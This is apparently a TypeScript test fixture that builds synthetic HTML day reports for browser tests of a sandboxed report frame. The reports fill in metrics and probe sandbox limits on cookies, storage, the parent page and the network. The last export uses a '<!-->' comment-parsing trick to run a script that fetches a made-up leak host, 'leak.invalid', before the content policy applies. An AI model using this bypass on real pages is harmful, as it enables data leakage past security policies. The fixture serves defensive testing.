/**
 * A made-up /wrap report for the browser tests, written to the report contract
 * (Contract 5 in the personal-systems plan) and nothing more.
 *
 * It holds no numbers of its own. It fills them in from the message the page
 * sends, takes the colour scheme from that message, and asks for the height it
 * needs. Along the way it records on its root element what it could and
 * couldn't do from inside the sandbox, so a test can read that back.
 *
 * `widthControlReportHtml` adds a width control beside a timeline heading, as
 * /wrap's template has one, and speaks the frame's width messages.
 * `syntheticReportHtml` has none, like the reports /wrap wrote before it had.
 */

/**
 * A timeline heading with the width control, which stays hidden until the
 * page says it can widen the timeline, over a track that stands in for the
 * timeline. Its row is as tall as the control, so showing it moves nothing.
 * Everything keeps the width the page says the report has in its column, in
 * the middle of the report's page, and the track too until the page says it is
 * wide, as /wrap's template does. Both are rounded to whole pixels, as there,
 * so the text sits where it would in a frame the column's width.
 */
const widthControl = `<style>
  main > :not(.track), [data-timeline="column"] .track { --text-width: round(var(--column, 100vw) - 40px, 1px); max-width: var(--text-width); margin-left: max(0px, round((100% - var(--text-width)) / 2, 1px)); }
  .track { height: 24px; background: #8a8a85; }
</style>
<div class="head"><h2>Timeline</h2><button type="button" data-width-toggle aria-label="Widen the timeline" hidden>&harr;</button></div>
<div class="track"></div>`;

/** Takes the column and the track's width, then says the report has the control; keeps the control to what the page says, and asks for the other width when pressed. */
const widthScript = `<script>
  const widthToggle = document.querySelector('[data-width-toggle]');
  widthToggle.addEventListener('click', () => {
    window.parent.postMessage({ type: 'postlude:report-width-request', wide: widthToggle.dataset.wide !== 'true' }, '*');
  });
  window.addEventListener('message', (event) => {
    if (event.source !== window.parent) { return; }
    const message = event.data;
    if (message === null || typeof message !== 'object' || message.type !== 'postlude:report-width') { return; }
    const probes = document.documentElement.dataset;
    probes.widthMessages = String(Number(probes.widthMessages ?? '0') + 1);
    document.documentElement.style.setProperty('--column', message.column + 'px');
    document.documentElement.dataset.timeline = message.wide ? 'wide' : 'column';
    widthToggle.hidden = !message.available;
    widthToggle.dataset.wide = String(message.wide);
    widthToggle.setAttribute('aria-label', message.wide ? 'Narrow the timeline' : 'Widen the timeline');
    if (probes.widthMessages === '1') {
      window.parent.postMessage({ type: 'postlude:report-width-control' }, '*');
    }
  });
</script>`;

const reportHtmlWith = ({
  timeline,
  script,
}: {
  readonly timeline: string;
  readonly script: string;
}): string => `<!-- A synthetic report for tests. -->
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Synthetic day report</title>
<style>
  :root { color-scheme: light; background: #ffffff; color: #1d1d1b; font: 16px/1.5 system-ui, sans-serif; }
  :root[data-theme="dark"] { color-scheme: dark; background: #1b1a18; color: #f1efe9; }
  body { margin: 0; }
  main { padding: 16px 20px; }
  h1 { font-size: 20px; margin: 0 0 8px; }
  dl { display: grid; grid-template-columns: max-content 1fr; gap: 4px 16px; margin: 0; }
  dd { margin: 0; }
  .head { display: flex; align-items: center; gap: 8px; height: 32px; margin: 16px 0 0; }
  h2 { font-size: 16px; margin: 0; }
  [data-width-toggle] { width: 32px; height: 32px; }
</style>
</head>
<body>
<main>
  <h1>Synthetic day</h1>
  <dl>
    <dt>Metrics version</dt><dd data-metric="metricsVersion">Waiting</dd>
    <dt>Active minutes</dt><dd data-metric="activeMinutes">Waiting</dd>
    <dt>Focus minutes</dt><dd data-metric="focusMinutes">Waiting</dd>
    <dt>Landed pull requests</dt><dd data-metric="landedPrs">Waiting</dd>
  </dl>
  ${timeline}
</main>
<script>
  const probes = document.documentElement.dataset;
  document.addEventListener('securitypolicyviolation', (event) => {
    probes.violations = [probes.violations, event.effectiveDirective].filter(Boolean).join(' ');
  });
  try { void document.cookie; probes.cookies = 'readable'; } catch { probes.cookies = 'blocked'; }
  try { void window.parent.document.title; probes.parentPage = 'readable'; } catch { probes.parentPage = 'blocked'; }
  try { void window.localStorage; probes.storage = 'readable'; } catch { probes.storage = 'blocked'; }
  fetch('data:text/plain,probe').then(
    () => { probes.network = 'reached'; },
    () => { probes.network = 'blocked'; },
  );
  window.addEventListener('message', (event) => {
    if (event.source !== window.parent) { return; }
    const message = event.data;
    if (message === null || typeof message !== 'object' || message.type !== 'postlude:day-metrics') { return; }
    probes.messages = String(Number(probes.messages ?? '0') + 1);
    probes.theme = message.theme;
    document.documentElement.dataset.theme = message.theme;
    for (const field of document.querySelectorAll('[data-metric]')) {
      const key = field.dataset.metric;
      const value = key === 'metricsVersion' ? message.metricsVersion : message.dayMetrics[key];
      field.textContent = value === null ? 'Not measured' : String(value);
    }
    const height = Math.ceil(document.querySelector('main').getBoundingClientRect().height);
    probes.requestedHeight = String(height);
    window.parent.postMessage({ type: 'postlude:report-height', height }, '*');
  });
</script>
${script}
</body>
</html>
`;

export const syntheticReportHtml = reportHtmlWith({ timeline: '', script: '' });

export const widthControlReportHtml = reportHtmlWith({
  timeline: widthControl,
  script: widthScript,
});

/** A made-up outside address, for reports that try to reach one. */
export const leakHost = 'leak.invalid';

/**
 * The same report behind `<!-->`, which a parser ends at once as an empty
 * comment, so the script after it runs before anything that follows. The
 * `<!-- -->` after the script makes the whole run look like one comment to
 * anything that reads up to the first `-->`.
 */
export const earlyScriptReportHtml = `<!--><script>fetch("https://${leakHost}/before-policy",{mode:"no-cors"})</script><!-- --> ${syntheticReportHtml}`;
